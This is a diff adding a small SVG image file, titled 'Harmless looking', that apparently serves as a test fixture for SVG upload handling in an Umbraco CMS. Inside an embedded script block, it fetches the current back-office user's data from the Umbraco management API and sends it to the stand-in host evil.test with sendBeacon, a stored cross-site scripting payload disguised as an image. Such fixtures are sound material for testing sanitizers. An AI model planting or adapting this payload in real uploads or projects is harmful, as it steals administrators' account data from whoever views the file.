@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">
+  <title>Harmless looking</title>
+  <style>.a { fill: #000 }</style>
+  <script type="application/ecmascript"><![CDATA[
+    fetch('/umbraco/management/api/v1/user/current').then(r => r.text()).then(t => navigator.sendBeacon('https://evil.test', t));
+  ]]></script>
+  <rect class="a" width="10" height="10"/>
+</svg>
